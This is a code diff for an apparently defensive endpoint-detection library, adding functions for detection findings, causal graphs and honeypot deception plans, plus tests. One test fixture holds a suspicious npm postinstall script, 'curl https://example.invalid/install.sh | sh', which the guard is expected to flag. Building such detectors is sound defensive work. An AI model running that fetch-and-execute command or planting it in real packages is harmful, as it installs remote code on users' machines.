@@ -1,7 +1,11 @@
 //! PolicyLabHandle -- JSON-in/JSON-out facade for cross-language bindings.
 
+use anyhow::{anyhow, Context};
 use serde::Serialize;
 
+use crate::edr::{
+    CausalGraphRecorder, DeceptionPlan, EndpointObservation, HoneyArtifact, SupplyChainRuntimeGuard,
+};
 #[cfg(not(feature = "timeline"))]
 use crate::event::{PolicyEvent, PolicyEventData, PolicyEventType};
 use crate::ocsf::policy_events_to_ocsf_jsonl;
@@ -116,6 +120,93 @@ impl PolicyLabHandle {
         }
         Ok(lines.join("\n"))
     }
+
+    /// Convert existing PolicyEvent JSONL into endpoint-observation JSONL.
+    pub fn to_endpoint_observations(events_jsonl: &str) -> anyhow::Result<String> {
+        let events = read_events_from_str(events_jsonl)?;
+        let mut lines = Vec::with_capacity(events.len());
+        for event in &events {
+            lines.push(serde_json::to_string(
+                &EndpointObservation::from_policy_event(event),
+            )?);
+        }
+        Ok(lines.join("\n"))
+    }
+
+    /// Evaluate endpoint observations with the built-in EDR guard set.
+    ///
+    /// `honey_artifacts_json` may be omitted or may contain a JSON array of
+    /// `HoneyArtifact` values from a deception plan. The return value is JSONL
+    /// of `DetectionFinding` records.
+    pub fn edr_findings(
+        observations_jsonl: &str,
+        honey_artifacts_json: Option<&str>,
+    ) -> anyhow::Result<String> {
+        let observations = read_endpoint_observations_from_str(observations_jsonl)?;
+        let honey_artifacts = match honey_artifacts_json {
+            Some(input) if !input.trim().is_empty() => {
+                serde_json::from_str::<Vec<HoneyArtifact>>(input)
+                    .context("failed to parse honey_artifacts_json as Vec<HoneyArtifact>")?
+            }
+            _ => Vec::new(),
+        };
+        let guard = SupplyChainRuntimeGuard::with_honey_artifacts(honey_artifacts);
+
+        let mut lines = Vec::new();
+        for observation in &observations {
+            for finding in guard.evaluate(observation) {
+                lines.push(serde_json::to_string(&finding)?);
+            }
+        }
+        Ok(lines.join("\n"))
+    }
+
+    /// Build a causal graph from endpoint-observation JSONL.
+    pub fn edr_causal_graph(observations_jsonl: &str) -> anyhow::Result<String> {
+        let observations = read_endpoint_observations_from_str(observations_jsonl)?;
+        let mut recorder = CausalGraphRecorder::new();
+        for observation in &observations {
+            recorder.record_observation(observation);
+        }
+        Ok(serde_json::to_string(&recorder.into_graph())?)
+    }
+
+    /// Render the standard endpoint deception plan without writing files.
+    pub fn edr_standard_deception_plan(root: &str, endpoint_id: &str) -> anyhow::Result<String> {
+        if root.trim().is_empty() {
+            return Err(anyhow!("deception root must not be empty"));
+        }
+        if endpoint_id.trim().is_empty() {
+            return Err(anyhow!("endpoint_id must not be empty"));
+        }
+        Ok(serde_json::to_string(&DeceptionPlan::standard(
+            root,
+            endpoint_id,
+        ))?)
+    }
+
+    /// Materialize a deception plan and return a JSON report.
+    pub fn edr_materialize_deception_plan(plan_json: &str) -> anyhow::Result<String> {
+        let plan = serde_json::from_str::<DeceptionPlan>(plan_json)
+            .context("failed to parse plan_json as DeceptionPlan")?;
+        Ok(serde_json::to_string(&plan.materialize()?)?)
+    }
+}
+
+fn read_endpoint_observations_from_str(input: &str) -> anyhow::Result<Vec<EndpointObservation>> {
+    let mut observations = Vec::new();
+    for (idx, line) in input.lines().enumerate() {
+        let trimmed = line.trim();
+        if trimmed.is_empty() {
+            continue;
+        }
+        observations.push(
+            serde_json::from_str(trimmed).with_context(|| {
+                format!("invalid endpoint observation JSONL at line {}", idx + 1)
+            })?,
+        );
+    }
+    Ok(observations)
 }
 
 #[cfg(not(feature = "timeline"))]
@@ -267,6 +358,10 @@ mod tests {
     #![allow(clippy::expect_used, clippy::unwrap_used)]
 
     use super::*;
+    use crate::edr::{
+        CodeSignatureStatus, DeceptionPlan, EndpointEvent, EndpointObservation, EndpointProcess,
+        PackageManager, SignatureTrust,
+    };
     use crate::event::{FileEventData, PolicyEvent, PolicyEventData, PolicyEventType};
     use chrono::Utc;
 
@@ -348,6 +443,77 @@ mod tests {
             .risks
             .iter()
             .any(|r| r.contains("No events provided")));
+    }
+
+    #[test]
+    fn to_endpoint_observations_converts_policy_event_jsonl() {
+        let observations = PolicyLabHandle::to_endpoint_observations(&sample_jsonl()).unwrap();
+        let parsed: EndpointObservation = serde_json::from_str(&observations).unwrap();
+
+        assert_eq!(parsed.event_name(), "file_access");
+    }
+
+    #[test]
+    fn edr_findings_returns_detection_jsonl() {
+        let observation = EndpointObservation {
+            process: EndpointProcess {
+                image: Some("/usr/local/bin/npm".to_string()),
+                signing: CodeSignatureStatus {
+                    trust: SignatureTrust::Signed,
+                    ..CodeSignatureStatus::default()
+                },
+                ..EndpointProcess::default()
+            },
+            event: EndpointEvent::PackageScript {
+                manager: PackageManager::Npm,
+                package: Some("leftpad-suspicious".to_string()),
+                phase: "postinstall".to_string(),
+                script: "curl https://example.invalid/install.sh | sh".to_string(),
+                working_directory: Some("/tmp/pkg".to_string()),
+            },
+            ..EndpointObservation::default()
+        };
+        let jsonl = serde_json::to_string(&observation).unwrap();
+
+        let findings = PolicyLabHandle::edr_findings(&jsonl, None).unwrap();
+
+        assert!(findings.contains("supply_chain.install_script.risky"));
+    }
+
+    #[test]
+    fn edr_causal_graph_returns_graph_json() {
+        let observation = EndpointObservation {
+            process: EndpointProcess {
+                process_guid: Some("proc-1".to_string()),
+                image: Some("/usr/bin/curl".to_string()),
+                ..EndpointProcess::default()
+            },
+            event: EndpointEvent::NetworkFlow {
+                host: "api.example.invalid".to_string(),
+                port: 443,
+                protocol: Some("tcp".to_string()),
+                url: Some("https://api.example.invalid/upload".to_string()),
+            },
+            ..EndpointObservation::default()
+        };
+        let jsonl = serde_json::to_string(&observation).unwrap();
+
+        let graph = PolicyLabHandle::edr_causal_graph(&jsonl).unwrap();
+        let parsed: serde_json::Value = serde_json::from_str(&graph).unwrap();
+
+        assert!(parsed["nodes"].as_object().unwrap().len() >= 2);
+        assert!(!parsed["edges"].as_array().unwrap().is_empty());
+    }
+
+    #[test]
+    fn edr_standard_deception_plan_is_json_contract() {
+        let plan_json =
+            PolicyLabHandle::edr_standard_deception_plan("/tmp/clawdstrike-honey", "endpoint-1")
+                .unwrap();
+        let plan: DeceptionPlan = serde_json::from_str(&plan_json).unwrap();
+
+        assert_eq!(plan.endpoint_id, "endpoint-1");
+        assert!(plan.artifacts.len() >= 5);
     }
 
     #[cfg(not(feature = "timeline"))]
